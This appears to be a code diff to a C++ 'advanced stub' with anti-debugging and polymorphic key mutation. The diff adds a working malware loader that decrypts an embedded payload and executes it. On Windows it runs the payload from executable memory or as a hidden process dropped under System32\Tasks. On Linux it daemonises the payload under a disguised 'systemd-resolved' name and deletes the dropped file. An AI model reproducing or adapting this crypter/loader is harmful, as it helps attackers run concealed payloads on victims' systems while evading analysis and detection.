@@ -10,6 +10,13 @@
 #include <ctime>
 #include <chrono>
 #include <thread>
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#endif
 
 // Standalone Advanced Stub - Anti-debugging + Polymorphism
 const std::string KEY_IWeWSH4l = "29c12c86755a4700e24624f71b5b8490";
@@ -195,14 +202,15 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
     }
 }
 
+// Embedded encrypted data (will be populated by linker)
+extern unsigned char embeddedData[];
+extern size_t embeddedDataSize;
+
 int main() {
     // Anti-debugging checks
     if (isDebuggerPresent() || checkTiming()) {
         return 1; // Exit if debugger detected
     }
-    
-    // Standalone stub - no embedded data
-    // Standalone stub - no embedded data}
     
     // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
@@ -214,25 +222,106 @@ int main() {
     PolymorphicEngine::mutateArray(key, 16, seed);
     PolymorphicEngine::mutateArray(nonce, 16, seed);
     
+    // Create buffer for decrypted data
+    std::vector<uint8_t> decryptedData(embeddedDataSize);
+    std::memcpy(decryptedData.data(), embeddedData, embeddedDataSize);
+    
     // Decrypt the data using AES-128-CTR
-    // Note: embeddedData and embeddedDataSize will be added by stub linker
-    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    aesCtrCrypt(decryptedData.data(), decryptedData.data(), embeddedDataSize, key, nonce);
     
     // Demutate the key and nonce
     PolymorphicEngine::demutateArray(key, 16, seed);
     PolymorphicEngine::demutateArray(nonce, 16, seed);
     
-    // Write decrypted data to file
-    // Note: embeddedData and embeddedDataSize will be added by stub linker
-    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
-    // if (outFile.is_open()) {
-    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
-        outFile.close();
-        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    // Execute or save based on file type
+    bool isExe = (embeddedDataSize > 2 && decryptedData[0] == 'M' && decryptedData[1] == 'Z');
+    
+    if (isExe) {
+        #ifdef _WIN32
+        // Enhanced Windows execution with anti-analysis
+        SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
+        
+        // Method 1: Direct memory execution
+        void* execMem = VirtualAlloc(NULL, embeddedDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (execMem) {
+            memcpy(execMem, decryptedData.data(), embeddedDataSize);
+            
+            // Try to execute as thread
+            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
+            if (hThread) {
+                WaitForSingleObject(hThread, INFINITE);
+                CloseHandle(hThread);
+            }
+            VirtualFree(execMem, 0, MEM_RELEASE);
+        } else {
+            // Fallback: temp file execution
+            char sysDir[MAX_PATH];
+            GetSystemDirectoryA(sysDir, MAX_PATH);
+            std::string exePath = std::string(sysDir) + "\\Tasks\\upd" + std::to_string(seed) + ".exe";
+            
+            // Create directory if needed
+            CreateDirectoryA((std::string(sysDir) + "\\Tasks").c_str(), NULL);
+            
+            std::ofstream exe(exePath, std::ios::binary);
+            if (exe.is_open()) {
+                exe.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+                exe.close();
+                
+                // Execute hidden
+                STARTUPINFOA si = {sizeof(si)};
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                PROCESS_INFORMATION pi = {0};
+                
+                CreateProcessA(NULL, const_cast<char*>(exePath.c_str()), NULL, NULL, FALSE,
+                              DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                
+                if (pi.hProcess) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }
+            }
+        }
+        #else
+        // Enhanced Linux execution
+        std::string tmpPath = "/var/tmp/.systemd-" + std::to_string(getpid());
+        std::ofstream exe(tmpPath, std::ios::binary);
+        if (exe.is_open()) {
+            exe.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            exe.close();
+            chmod(tmpPath.c_str(), 0755);
+            
+            // Double fork for daemon mode
+            pid_t pid = fork();
+            if (pid == 0) {
+                setsid();
+                pid = fork();
+                if (pid == 0) {
+                    execl(tmpPath.c_str(), "systemd-resolved", NULL);
+                    exit(0);
+                }
+                exit(0);
+            }
+            
+            // Clean up
+            usleep(500000);
+            unlink(tmpPath.c_str());
+        }
+        #endif
     } else {
-        std::cerr << "Failed to create output file" << std::endl;
-        return 1;
+        // Save non-executable data
+        std::string filename = "data_" + std::to_string(time(NULL)) + ".dat";
+        std::ofstream outFile(filename, std::ios::binary);
+        if (outFile.is_open()) {
+            outFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            outFile.close();
+        }
     }
+    
+    // Clear sensitive data
+    std::memset(key, 0, sizeof(key));
+    std::memset(nonce, 0, sizeof(nonce));
+    std::memset(decryptedData.data(), 0, embeddedDataSize);
     
     return 0;
 }
